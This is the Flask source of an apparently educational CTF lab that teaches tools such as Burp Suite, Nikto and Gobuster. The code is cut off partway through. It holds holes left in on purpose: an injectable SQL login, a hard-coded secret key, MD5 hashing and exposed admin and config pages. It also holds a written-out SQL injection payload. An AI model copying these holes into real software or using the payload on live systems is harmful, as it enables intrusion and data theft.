import os
import json
import hashlib
import subprocess
import sqlite3
import pickle
import base64
import secrets
from datetime import datetime
from functools import wraps
from flask import Flask, render_template_string, request, redirect, url_for, session, make_response, jsonify
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.secret_key = 'supersecretkey123'

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///vulnerable.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# ==================== MODELS ====================
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)
    email = db.Column(db.String(120))
    role = db.Column(db.String(20), default='user')
    bio = db.Column(db.Text)

class Post(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(200))
    content = db.Column(db.Text)
    user_id = db.Column(db.Integer)

class Message(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    sender = db.Column(db.String(80))
    receiver = db.Column(db.String(80))
    content = db.Column(db.Text)

class Submission(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80))
    tool_name = db.Column(db.String(100))
    submitted_flag = db.Column(db.String(100))
    correct = db.Column(db.Boolean)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

# ==================== HELPERS ====================
def weak_hash(password):
    return hashlib.md5(password.encode()).hexdigest()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('ctf_login'))
        return f(*args, **kwargs)
    return decorated_function

# ==================== CTF ROUTES ====================

@app.route('/')
def index():
    # Get flash message if any
    flash_message = session.pop('flash_message', None)
    flash_type = session.pop('flash_type', None)
    flash_points = session.pop('flash_points', None)
    
    # Check if user is logged in and get their progress
    solved = []
    total_score = 0
    is_admin = False
    if 'username' in session:
        user_submissions = Submission.query.filter_by(username=session['username'], correct=True).all()
        solved = [s.tool_name for s in user_submissions]
        tools = get_tool_info()
        for tool_name in solved:
            if tool_name in tools:
                total_score += tools[tool_name]['points']
        is_admin = session['username'] == 'DEMON'
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Security Tools CTF</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; }
            .header { background: linear-gradient(135deg, #001a00, #003300); padding: 30px; text-align: center; border-bottom: 3px solid #00ff00; }
            .header h1 { font-size: 2.5em; text-shadow: 0 0 20px #00ff00; }
            .header p { color: #00cc00; margin-top: 10px; }
            .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
            .nav { display: flex; justify-content: center; gap: 20px; padding: 20px; background: #111; }
            .nav a { color: #00ff00; text-decoration: none; padding: 10px 20px; border: 1px solid #00ff00; transition: all 0.3s; }
            .nav a:hover { background: #00ff00; color: #000; }
            .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; margin-top: 15px; }
            .tool-card { background: #111; border: 2px solid #333; padding: 20px; transition: all 0.3s; }
            .tool-card:hover { border-color: #00ff00; }
            .tool-card.completed { border-color: #666; background: #0a0a0a; opacity: 0.7; }
            .tool-icon { font-size: 2.5em; margin-bottom: 10px; }
            .tool-name { font-size: 1.2em; color: #00ff00; margin-bottom: 5px; }
            .tool-desc { color: #888; font-size: 0.9em; margin-bottom: 10px; }
            .tool-points { color: #ff6600; font-weight: bold; }
            .btn { display: inline-block; padding: 8px 15px; background: #00ff00; color: #000; text-decoration: none; margin-top: 10px; font-size: 0.9em; }
            .btn:hover { background: #00cc00; }
            .btn-completed { background: #333; color: #666; cursor: not-allowed; }
            .stats { background: #111; padding: 15px; margin: 15px 0; border: 1px solid #333; text-align: center; }
            .stats span { margin: 0 20px; }
            .highlight { color: #ff6600; font-weight: bold; }
            .warning { background: #1a1a00; border: 1px solid #666; padding: 15px; margin: 15px 0; text-align: center; }
            .section-title { color: #ff6600; border-bottom: 2px solid #333; padding-bottom: 10px; margin: 30px 0 15px 0; }
            .completed-badge { background: #00ff00; color: #000; padding: 3px 8px; font-size: 0.8em; margin-left: 10px; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🔐 SECURITY TOOLS CTF</h1>
            <p>Master 15 Security Tools • Find Hidden Flags • No Cheating!</p>
        </div>
        
        <div class="nav">
            <a href="/">🏠 Home</a>
            <a href="/ctf/login">👤 Login</a>
            <a href="/ctf/submit">🚩 Submit Flag</a>
            <a href="/ctf/scoreboard">🏆 Scoreboard</a>
        </div>
        
        <div class="container">
            {% if flash_message %}
            <div style="background: {% if flash_type == 'success' %}#001a00; border: 2px solid #00ff00{% else %}#1a0000; border: 2px solid #ff0000{% endif %}; padding: 25px; margin: 15px 0; text-align: center; font-size: 1.3em; color: {% if flash_type == 'success' %}#00ff00{% else %}#ff0000{% endif %};">
                {% if flash_type == 'success' %}
                🎉 GOOD JOB! {{ flash_message }} 
                {% if flash_points %}<span style="color: #ff6600; font-weight: bold;">+{{ flash_points }} pts</span>{% endif %}
                {% else %}
                {{ flash_message }}
                {% endif %}
            </div>
            {% endif %}
            
            <div class="warning">
                ⚠️ Flags are hidden throughout the lab. You must use each tool to find its flag. There is NO /debug endpoint!
            </div>
            
            {% if 'username' in session %}
            <div style="background: #111; border: 2px solid #00ff00; padding: 20px; margin: 15px 0; display: flex; justify-content: space-between; align-items: center;">
                <div>
                    <span style="color: #ff6600;">Player: {{ session.username }}</span>
                    <span style="margin-left: 30px;">Score: <strong style="font-size: 1.2em;">{{ total_score }}</strong> / 245 pts</span>
                    <span style="margin-left: 30px;">Solved: <strong>{{ solved|length }}</strong> / 15</span>
                </div>
                <div>
                    {% if is_admin %}
                    <a href="/ctf/reset" onclick="return confirm('⚠️ Are you sure? This will save all data to JSON and reset the CTF!')" style="background: #ff0000; color: #fff; padding: 10px 20px; text-decoration: none; border: none; font-weight: bold;">🔄 RESET CTF</a>
                    {% endif %}
                </div>
            </div>
            {% endif %}
            
            <div class="stats">
                <span>Total Tools: <span class="highlight">15</span></span>
                <span>Total Flags: <span class="highlight">15</span></span>
                <span>Total Points: <span class="highlight">245</span></span>
            </div>
            
            {% if 'username' in session and completed_tools %}
            <h2 class="section-title">✅ Completed Missions ({{ completed_tools|length }})</h2>
            <div class="tools-grid">
                {% for tool in completed_tools %}
                <div class="tool-card completed">
                    <div class="tool-icon">{{ tool.icon }}</div>
                    <div class="tool-name">{{ tool.name }} <span class="completed-badge">✓ DONE</span></div>
                    <div class="tool-desc">{{ tool.description }}</div>
                    <div class="tool-points">{{ tool.points }} pts - Earned!</div>
                    <a class="btn btn-completed">Completed</a>
                </div>
                {% endfor %}
            </div>
            {% endif %}
            
            <h2 class="section-title">{% if 'username' in session %}🎯 Available Missions ({{ available_tools|length }}){% else %}Available Tools{% endif %}</h2>
            
            <div class="tools-grid">
                {% for tool in available_tools %}
                <div class="tool-card">
                    <div class="tool-icon">{{ tool.icon }}</div>
                    <div class="tool-name">{{ tool.name }}</div>
                    <div class="tool-desc">{{ tool.description }}</div>
                    <div class="tool-points">{{ tool.points }} pts</div>
                    <a href="/ctf/tool/{{ tool.id }}" class="btn">Start Mission →</a>
                </div>
                {% endfor %}
            </div>
        </div>
    </body>
    </html>
    ''', 
    flash_message=flash_message, 
    flash_type=flash_type,
    flash_points=flash_points,
    total_score=total_score, 
    solved=solved,
    is_admin=is_admin,
    available_tools=[{'id': k, **v} for k, v in get_tool_info().items() if k not in solved],
    completed_tools=[{'id': k, **v} for k, v in get_tool_info().items() if k in solved]
    )

@app.route('/ctf/login', methods=['GET', 'POST'])
def ctf_login():
    if request.method == 'POST':
        action = request.form.get('action')
        username = request.form.get('username')
        password = request.form.get('password')
        
        if action == 'register':
            if User.query.filter_by(username=username).first():
                return "Username already exists!"
            new_user = User(username=username, password=weak_hash(password), email=f'{username}@ctf.local', role='user')
            db.session.add(new_user)
            db.session.commit()
            return redirect(url_for('ctf_login'))
        else:
            user = User.query.filter_by(username=username, password=weak_hash(password)).first()
            if user:
                session['user_id'] = user.id
                session['username'] = user.username
                return redirect(url_for('index'))
            return "Invalid credentials!"
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>CTF Login</title>
        <style>
            body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .login-box { background: #111; border: 2px solid #00ff00; padding: 40px; width: 400px; }
            h2 { text-align: center; margin-bottom: 30px; }
            input { width: 100%; padding: 12px; margin: 8px 0; background: #0a0a0a; border: 1px solid #00ff00; color: #00ff00; font-family: inherit; }
            button { width: 100%; padding: 15px; margin: 8px 0; background: #00ff00; color: #000; border: none; cursor: pointer; font-weight: bold; font-family: inherit; }
            button:hover { background: #00cc00; }
            .links { text-align: center; margin-top: 20px; }
            .links a { color: #00ff00; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>═══ CTF LOGIN ═══</h2>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="action" value="login">LOGIN</button>
                <button type="submit" name="action" value="register">REGISTER</button>
            </form>
            <div class="links"><a href="/">← Back</a></div>
        </div>
    </body>
    </html>
    ''')

@app.route('/ctf/tool/<tool_name>')
@login_required
def tool_challenge(tool_name):
    # Check if already solved - redirect back if completed
    already_solved = Submission.query.filter_by(
        username=session['username'],
        tool_name=tool_name,
        correct=True
    ).first() is not None
    
    if already_solved:
        session['flash_message'] = f'Mission already completed! Check your progress on the dashboard.'
        session['flash_type'] = 'error'
        return redirect(url_for('index'))
    
    # Get tool info
    tools = get_tool_info()
    if tool_name not in tools:
        return "Challenge not found", 404
    
    tool = tools[tool_name]
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>{{ tool.name }} - CTF Challenge</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; }
            .header { background: linear-gradient(135deg, #001a00, #003300); padding: 20px; border-bottom: 3px solid #00ff00; }
            .header h1 { font-size: 1.8em; }
            .container { max-width: 1000px; margin: 0 auto; padding: 20px; }
            .nav { display: flex; justify-content: center; gap: 15px; padding: 15px; background: #111; }
            .nav a { color: #00ff00; text-decoration: none; padding: 8px 15px; border: 1px solid #333; }
            .nav a:hover { border-color: #00ff00; }
            .section { background: #111; border: 1px solid #333; padding: 20px; margin: 15px 0; }
            .section h2 { color: #ff6600; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 15px; }
            .learn pre { background: #0a0a0a; padding: 15px; overflow-x: auto; border: 1px solid #333; font-size: 0.9em; }
            .task { background: #001a00; border: 1px solid #00ff00; padding: 20px; }
            .hint-box { background: #1a1a00; border: 1px solid #666; padding: 15px; margin-top: 10px; }
            .flag-form { margin-top: 20px; }
            .flag-form input[type="text"] { padding: 12px; width: 70%; background: #0a0a0a; border: 1px solid #00ff00; color: #00ff00; font-family: inherit; }
            .flag-form button { padding: 12px 25px; background: #00ff00; color: #000; border: none; cursor: pointer; font-weight: bold; font-family: inherit; }
            .solved { background: #00ff00; color: #000; padding: 15px; text-align: center; font-size: 1.1em; margin: 15px 0; }
            .message { padding: 15px; margin: 15px 0; text-align: center; }
            .success { background: #001a00; border: 1px solid #00ff00; }
            .error { background: #1a0000; border: 1px solid #ff0000; color: #ff0000; }
            details { cursor: pointer; }
            summary { color: #ff6600; padding: 10px 0; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>{{ tool.icon }} {{ tool.name }}</h1>
            <p>Points: {{ tool.points }} | Category: {{ tool.category }}</p>
        </div>
        
        <div class="nav">
            <a href="/">← All Tools</a>
            <a href="/ctf/submit">Submit Flag</a>
            <a href="/ctf/scoreboard">Scoreboard</a>
        </div>
        
        <div class="container">
            <div class="section">
                <h2>📖 How to Use {{ tool.name }}</h2>
                <div class="learn">
                    {{ tool.learn | safe }}
                </div>
            </div>
            
            <div class="section task">
                <h2>🎯 Challenge Task</h2>
                <p><strong>{{ tool.task }}</strong></p>
                
                {% if tool_name == 'burpsuite' %}
                <div style="margin-top: 15px; padding: 15px; background: #001a00; border: 1px solid #00ff00;">
                    <strong>🚀 Target Login Page:</strong><br>
                    <a href="/ctf/tool/burpsuite/login" style="color: #00ff00; font-size: 1.1em; text-decoration: none;">→ Open Burp Suite Login Page</a>
                </div>
                {% endif %}
                
                {% if tool_name == 'nikto' %}
                <div style="margin-top: 15px; padding: 15px; background: #001a00; border: 1px solid #00ff00;">
                    <strong>🎯 Target Login Page:</strong><br>
                    <a href="/ctf/tool/nikto/login" style="color: #00ff00; font-size: 1.1em; text-decoration: none;">→ Open Nikto Target Login</a>
                </div>
                {% endif %}
                
                {% if tool_name == 'gobuster' %}
                <div style="margin-top: 15px; padding: 15px; background: #001a00; border: 1px solid #00ff00;">
                    <strong>🔍 Directory Discovery Target:</strong><br>
                    <a href="/ctf/tool/gobuster" style="color: #00ff00; font-size: 1.1em; text-decoration: none;">→ Open Gobuster Target</a>
                </div>
                {% endif %}
                
                {% if tool_name == 'sqlmap' %}
                <div style="margin-top: 15px; padding: 15px; background: #001a00; border: 1px solid #00ff00;">
                    <strong>💉 SQL Injection Target:</strong><br>
                    <a href="/ctf/tool/sqlmap" style="color: #00ff00; font-size: 1.1em; text-decoration: none;">→ Open SQLmap Target</a>
                </div>
                {% endif %}
                
                {% if tool_name == 'john' %}
                <div style="margin-top: 15px; padding: 15px; background: #001a00; border: 1px solid #00ff00;">
                    <strong>John the Ripper Target:</strong><br>
                    <a href="/ctf/tool/john" style="color: #00ff00; font-size: 1.1em; text-decoration: none;">→ Open John Challenge</a>
                </div>
                {% endif %}
                
                {% if tool_name == 'hashcat' %}
                <div style="margin-top: 15px; padding: 15px; background: #001a00; border: 1px solid #00ff00;">
                    <strong>Hashcat Target:</strong><br>
                    <a href="/ctf/tool/hashcat" style="color: #00ff00; font-size: 1.1em; text-decoration: none;">→ Open Hashcat Challenge</a>
                </div>
                {% endif %}
                
                {% if tool_name == 'hydra' %}
                <div style="margin-top: 15px; padding: 15px; background: #001a00; border: 1px solid #00ff00;">
                    <strong>Hydra SSH Target:</strong><br>
                    <a href="/ctf/tool/hydra" style="color: #00ff00; font-size: 1.1em; text-decoration: none;">→ Open Hydra Challenge</a>
                </div>
                {% endif %}
                
                {% if tool_name == 'wireshark' %}
                <div style="margin-top: 15px; padding: 20px; background: #001a00; border: 1px solid #00ff00;">
                    <strong>📡 Packet Sender:</strong><br><br>
                    <p style="margin-bottom: 15px;">Start Wireshark capture first, then click the button to send packets:</p>
                    <code style="background: #0a0a0a; padding: 5px 10px; display: block; margin-bottom: 15px;">sudo wireshark -i any -f "tcp port 5000"</code>
                    <button onclick="sendPackets()" style="background: #ff6600; color: #000; padding: 15px 30px; border: none; font-weight: bold; font-family: inherit; cursor: pointer; font-size: 1.1em;">
                        📨 SEND PACKET REQUEST
                    </button>
                    <div id="packet-status" style="margin-top: 15px; display: none;"></div>
                    <script>
                    function sendPackets() {
                        var status = document.getElementById('packet-status');
                        status.style.display = 'block';
                        status.innerHTML = '<span style="color: #ff6600;">Sending packets...</span>';
                        
                        var count = 0;
                        var urls = ['/ctf/tool/wireshark/send'];
                        for (var i = 1; i <= 8; i++) urls.push('/ctf/tool/wireshark/extra/' + i);
                        
                        function sendNext() {
                            if (count >= urls.length) {
                                status.innerHTML = '<span style="color: #00ff00;">✅ All packets sent! Check Wireshark for the flag in HTTP headers.</span>';
                                return;
                            }
                            fetch(urls[count]).then(function(r) { return r.text(); }).then(function() {
                                count++;
                                setTimeout(sendNext, 200);
                            });
                        }
                        sendNext();
                    }
                    </script>
                </div>
                {% endif %}
                
                {% if tool_name == 'responder' %}
                <div style="margin-top: 15px; padding: 20px; background: #001a00; border: 1px solid #00ff00;">
                    <strong>📡 NTLM Traffic Generator:</strong><br><br>
                    <p style="margin-bottom: 15px;">Click to send NTLM auth requests that Responder would capture:</p>
                    <div style="margin-bottom: 15px;">
                        <button onclick="window.location='/ctf/tool/responder/ntlm'" style="background: #ff6600; color: #000; padding: 15px 30px; border: none; font-weight: bold; font-family: inherit; cursor: pointer; font-size: 1.1em; margin-right: 10px;">
                            🔐 SEND NTLM AUTH
                        </button>
                        <button onclick="window.location='/ctf/tool/responder/trigger'" style="background: #ff0000; color: #fff; padding: 15px 30px; border: none; font-weight: bold; font-family: inherit; cursor: pointer; font-size: 1.1em;">
                            💥 TRIGGER SMB TRAFFIC
                        </button>
                    </div>
                    <p style="color: #888; font-size: 0.9em;">The flag is hidden in the NTLM hash - decode the Base64 to reveal it!</p>
                </div>
                {% endif %}
                
                <details style="margin-top: 15px;">
                    <summary>💡 Show Hint</summary>
                    <div class="hint-box">
                        <pre>{{ tool.hint }}</pre>
                    </div>
                </details>
            </div>
            
            <div class="section">
                <h2>🚩 Submit Flag</h2>
                {% if message %}
                <div class="message {{ msg_type }}">{{ message }}</div>
                {% endif %}
                <form method="POST" action="/ctf/submit" class="flag-form">
                    <input type="hidden" name="tool_name" value="{{ tool_name }}">
                    <input type="text" name="flag" placeholder="Enter FLAG{...}" required>
                    <button type="submit">SUBMIT</button>
                </form>
            </div>
        </div>
    </body>
    </html>
    ''', tool=tool, tool_name=tool_name, message=None, msg_type=None)

@app.route('/ctf/tool/burpsuite/login', methods=['GET', 'POST'])
def burpsuite_login():
    message = ''
    msg_type = ''
    flag_revealed = False
    
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        # Vulnerable SQL query - vulnerable to injection
        import sqlite3
        conn = sqlite3.connect('/app/instance/vulnerable.db')
        cursor = conn.cursor()
        
        query = f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'"
        
        try:
            cursor.execute(query)
            result = cursor.fetchone()
            conn.close()
            
            if result:
                # Flag returned in HTTP header - visible only in Burp Suite
                from flask import make_response
                flag = get_flag_for_tool("burpsuite")
                resp = make_response(render_template_string('''
                <!DOCTYPE html>
                <html>
                <head><title>Login Success</title>
                <style>
                    body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
                    .box { background: #111; border: 2px solid #00ff00; padding: 40px; text-align: center; width: 500px; }
                    h2 { color: #ff6600; margin-bottom: 20px; }
                    .msg { background: #001a00; border: 1px solid #00ff00; padding: 20px; margin: 20px 0; }
                    .hint { background: #1a1a00; border: 1px solid #666; padding: 15px; margin-top: 20px; font-size: 0.9em; color: #888; }
                    a { color: #00ff00; }
                </style>
                </head>
                <body>
                    <div class="box">
                        <h2>🔓 Login Successful!</h2>
                        <div class="msg">
                            <strong>Welcome, admin!</strong><br><br>
                            🚩 Check the response headers in Burp Suite to find the flag!
                        </div>
                        <div class="hint">
                            <strong>💡 Hint:</strong> Look for a custom HTTP header in the response.<br>
                            In Burp: Proxy → HTTP History → Click the POST request → Response tab → Headers
                        </div>
                        <br>
                        <a href="/ctf/tool/burpsuite/login">← Try Again</a> | <a href="/">🏠 Dashboard</a>
                    </div>
                </body>
                </html>
                '''))
                resp.headers['X-CTF-Flag'] = flag
                return resp
            else:
                message = 'Invalid credentials! Try again.'
                msg_type = 'error'
        except Exception as e:
            conn.close()
            message = f'SQL Error: {str(e)}'
            msg_type = 'error'
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Burp Suite Login - CTF Challenge</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
            .login-box { background: #111; border: 2px solid #00ff00; padding: 40px; width: 500px; }
            h2 { text-align: center; margin-bottom: 30px; color: #ff6600; }
            .form-group { margin-bottom: 20px; }
            label { display: block; margin-bottom: 5px; color: #888; }
            input { width: 100%; padding: 12px; background: #0a0a0a; border: 1px solid #00ff00; color: #00ff00; font-family: inherit; }
            button { width: 100%; padding: 15px; background: #00ff00; color: #000; border: none; cursor: pointer; font-weight: bold; font-family: inherit; margin-top: 10px; }
            button:hover { background: #00cc00; }
            .message { padding: 15px; margin: 20px 0; text-align: center; border: 1px solid; }
            .success { background: #001a00; border-color: #00ff00; color: #00ff00; }
            .error { background: #1a0000; border-color: #ff0000; color: #ff0000; }
            .nav { text-align: center; margin-top: 20px; }
            .nav a { color: #00ff00; margin: 0 15px; text-decoration: none; }
            .nav a:hover { text-decoration: underline; }
            .hint { background: #1a1a00; border: 1px solid #666; padding: 15px; margin-top: 20px; font-size: 0.9em; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>🔒 Secure Login Portal</h2>
            
            {% if message %}
            <div class="message {{ msg_type }}">{{ message }}</div>
            {% endif %}
            
            <form method="POST">
                <div class="form-group">
                    <label>Username:</label>
                    <input type="text" name="username" placeholder="Enter username" required>
                </div>
                <div class="form-group">
                    <label>Password:</label>
                    <input type="password" name="password" placeholder="Enter password" required>
                </div>
                <button type="submit">LOGIN</button>
            </form>
            
            <div class="hint">
                <strong>💡 Burp Suite Challenge:</strong><br>
                1. Set browser proxy to <code>127.0.0.1:8080</code><br>
                2. Turn on Intercept in Burp<br>
                3. Submit this form<br>
                4. Modify the username in Burp to: <code>admin' OR '1'='1</code><br>
                5. Forward the request and get the flag!
            </div>
            
            <div class="nav">
                <a href="/ctf/tool/burpsuite">← Back to Challenge</a>
                <a href="/">🏠 Dashboard</a>
            </div>
        </div>
    </body>
    </html>
    ''', message=message, msg_type=msg_type, flag_revealed=flag_revealed)

@app.route('/ctf/tool/nikto/login', methods=['GET', 'POST'])
def nikto_login():
    """Nikto login page with vulnerabilities for scanning"""
    message = ''
    msg_type = ''
    flag_revealed = False
    
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        # Intentionally vulnerable to show Nikto findings
        if username == 'admin' and password == 'admin':
            flag_revealed = True
            message = f'Welcome admin! Your flag: {get_flag_for_tool("nikto")}'
            msg_type = 'success'
        else:
            message = 'Invalid credentials!'
            msg_type = 'error'
    
    from flask import make_response
    resp = make_response(render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Nikto Target - Login</title>
        <style>
            body { font-family: Arial, sans-serif; background: #1a1a2e; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
            .login-box { background: #16213e; padding: 40px; border-radius: 10px; width: 400px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
            h2 { text-align: center; color: #e94560; margin-bottom: 30px; }
            .form-group { margin-bottom: 20px; }
            label { display: block; margin-bottom: 5px; color: #aaa; }
            input { width: 100%; padding: 12px; background: #0f3460; border: 1px solid #e94560; color: #fff; border-radius: 5px; box-sizing: border-box; }
            button { width: 100%; padding: 15px; background: #e94560; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
            button:hover { background: #c81d4e; }
            .message { padding: 15px; margin: 20px 0; border-radius: 5px; text-align: center; }
            .success { background: #0a8754; }
            .error { background: #c81d4e; }
            .hint { background: #0f3460; padding: 15px; margin-top: 20px; border-radius: 5px; font-size: 0.9em; }
            .nav { text-align: center; margin-top: 20px; }
            .nav a { color: #e94560; margin: 0 15px; text-decoration: none; }
            .server-header { background: #0f3460; padding: 10px; margin-bottom: 20px; border-radius: 5px; font-size: 0.8em; color: #aaa; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>🔒 Employee Login</h2>
            
            <div class="server-header">
                Server: Apache/2.4.41 (Ubuntu)<br>
                X-Powered-By: Flask/1.1.2<br>
                X-AspNet-Version: 4.0.30319
            </div>
            
            {% if message %}
            <div class="message {{ msg_type }}">{{ message }}</div>
            {% endif %}
            
            <form method="POST">
                <div class="form-group">
                    <label>Username:</label>
                    <input type="text" name="username" placeholder="Enter username">
                </div>
                <div class="form-group">
                    <label>Password:</label>
                    <input type="password" name="password" placeholder="Enter password">
                </div>
                <button type="submit">Login</button>
            </form>
            
            <div class="hint">
                <strong>Nikto Challenge:</strong><br>
                1. Run: <code>nikto -h http://localhost:5000/ctf/tool/nikto</code><br>
                2. Nikto will find: backup files, server info leaks<br>
                3. Check for /backup.sql in the output<br>
                4. The flag is in the backup file!
            </div>
            
            <div class="nav">
                <a href="/ctf/tool/nikto">← Challenge</a>
                <a href="/">Dashboard</a>
            </div>
        </div>
    </body>
    </html>
    ''', message=message, msg_type=msg_type, flag_revealed=flag_revealed))
    
    # Add vulnerable headers that Nikto detects
    resp.headers['Server'] = 'Apache/2.4.41 (Ubuntu)'
    resp.headers['X-Powered-By'] = 'Flask/1.1.2'
    resp.headers['X-AspNet-Version'] = '4.0.30319'
    resp.headers['X-Frame-Options'] = 'SAMEORIGIN'  # Present but weak
    # Missing: X-Content-Type-Options, X-XSS-Protection, CSP, HSTS
    return resp

@app.route('/ctf/tool/nikto/upload', methods=['PUT', 'DELETE', 'OPTIONS'])
def nikto_upload():
    """Dangerous HTTP methods that Nikto flags"""
    from flask import make_response
    
    if request.method == 'OPTIONS':
        resp = make_response('')
        resp.headers['Allow'] = 'GET, POST, PUT, DELETE, OPTIONS'
        return resp
    elif request.method == 'PUT':
        data = request.get_data().decode()
        resp = make_response(f'File uploaded: {len(data)} bytes')
        resp.headers['X-Upload-Status'] = 'success'
        return resp
    elif request.method == 'DELETE':
        return make_response('File deleted', 200)

@app.route('/ctf/tool/nikto/admin/')
def nikto_admin():
    """Exposed admin panel"""
    return """<html>
<head><title>Admin Panel</title></head>
<body>
<h1>Admin Control Panel</h1>
<p>Welcome to the admin panel. This page should be protected!</p>
<ul>
<li><a href="/admin/users">User Management</a></li>
<li><a href="/admin/logs">View Logs</a></li>
<li><a href="/admin/config">Server Config</a></li>
</ul>
<p>Default credentials: admin/admin</p>
</body>
</html>
""", 200, {'Content-Type': 'text/html'}

@app.route('/ctf/tool/nikto/server-config')
def nikto_server_config():
    """Exposed server configuration"""
    return """# Server Configuration - SENSITIVE DATA
# DO NOT EXPOSE THIS FILE!

[database]
host = 192.168.1.100
port = 3306
user = root
password = SuperSecret123!
database = production_db

[api]
key = sk_live_abcdef1234567890
secret = whsec_1234567890abcdef

[smtp]
host = smtp.gmail.com
port = 587
user = admin@company.com
password = EmailPass123!

# CTF Flag: Stored in backup.sql
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/gobuster')
def gobuster_main():
    """Gobuster challenge main page"""
    return render_template_string('''<!DOCTYPE html>
<html>
<head>
    <title>Gobuster Challenge</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a2e; color: #fff; padding: 40px; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #e94560; text-align: center; }
        .info { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px 0; }
        .code { background: #0f3460; padding: 15px; border-radius: 5px; font-family: monospace; margin: 10px 0; }
        .hint { background: #0a8754; padding: 15px; border-radius: 5px; }
        a { color: #e94560; }
        .nav { text-align: center; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 Gobuster Directory Discovery</h1>
        
        <div class="info">
            <h2>What is Gobuster?</h2>
            <p>Gobuster is a directory/file brute-forcing tool used to discover hidden paths on web servers.</p>
        </div>
        
        <div class="info">
            <h2>Challenge</h2>
            <p>Use Gobuster to discover hidden directories on this server.</p>
            <p>The flag is hidden in one of the discovered directories!</p>
        </div>
        
        <div class="code">
            <strong>Quick Start:</strong><br>
            gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt<br>
            <br>
            <strong>With extensions:</strong><br>
            gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -x txt,html,php
        </div>
        
        <div class="hint">
            <strong>💡 Tips:</strong><br>
            - Try common directory names (admin, secret, backup, hidden, private)<br>
            - Check for common file extensions (.txt, .bak, .sql, .config)<br>
            - Look at robots.txt for hints
        </div>
        
        <div class="nav">
            <a href="/">← Dashboard</a> | <a href="/ctf/submit">Submit Flag</a>
        </div>
    </div>
</body>
</html>
''')

@app.route('/ctf/tool/gobuster/admin/')
def gobuster_admin():
    """Hidden admin directory"""
    return """<!DOCTYPE html>
<html>
<head><title>Admin Panel</title></head>
<body style="font-family: Arial; background: #1a1a2e; color: #fff; padding: 40px;">
<h1>🔧 Admin Panel</h1>
<p>Welcome to the admin area.</p>
<ul>
<li><a href="/ctf/tool/gobuster/admin/users">User Management</a></li>
<li><a href="/ctf/tool/gobuster/admin/logs">System Logs</a></li>
<li><a href="/ctf/tool/gobuster/admin/backup">Backup Tools</a></li>
</ul>
<p><a href="/">← Back</a></p>
</body>
</html>
""", 200, {'Content-Type': 'text/html'}

@app.route('/ctf/tool/gobuster/admin/users')
def gobuster_users():
    """User list in admin"""
    return """User List:
- admin (admin@company.com)
- john (john@company.com)
- jane (jane@company.com)
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/gobuster/admin/logs')
def gobuster_logs():
    """System logs"""
    return """[2024-01-15 10:30:45] Login successful: admin
[2024-01-15 10:31:22] File uploaded: backup.sql
[2024-01-15 10:32:15] Configuration changed
[2024-01-15 10:33:00] System backup completed
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/gobuster/admin/backup')
def gobuster_backup():
    """Backup tools page"""
    return """Backup Tools:
- Database backup: /admin/backup/db
- File backup: /admin/backup/files
- Full system backup: /admin/backup/full
""", 200, {'Content-Type': 'text/plain'}

@app.route('/ctf/tool/gobuster/secret')
def gobuster_secret():
    """Hidden secret directory"""
    flag = get_flag_for_tool('gobuster')
    return f"""<!DOCTYPE html>
<html>
<head><title>Secret Directory</title></head>
<body style="font-family: Arial; background: #1a1a2e; color: #fff; padding: 40px;">
<h1>🗝️ Secret Directory</h1>
